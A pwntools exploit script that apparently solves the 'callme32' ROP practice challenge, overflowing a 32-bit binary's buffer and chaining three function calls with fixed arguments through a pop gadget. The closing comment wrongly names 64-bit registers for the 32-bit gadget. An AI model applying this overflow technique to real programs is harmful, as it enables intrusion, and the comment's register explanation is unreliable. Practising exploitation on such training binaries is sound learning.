from pwn import *

elf = context.binary = ELF('./callme32', checksec=False,)
context.log_level = 'debug'

io = process()

pop3 = 0x080487f9

payload = flat(
	b'A' * 44,
	elf.sym['callme_one'],
	pop3,
	0xdeadbeef,
	0xcafebabe,
	0xd00df00d,
	elf.sym['callme_two'],
	pop3,
	0xdeadbeef,
	0xcafebabe,
	0xd00df00d,
	elf.sym['callme_three'],
	pop3,
	0xdeadbeef,
	0xcafebabe,
	0xd00df00d,
)

# First time encountering a 32-bit binary that requires to use a gadget to pass arguments
# Pop3 is basically has pop rdi, pop rdi and pop rdx in one go

io.sendline(payload)
io.interactive()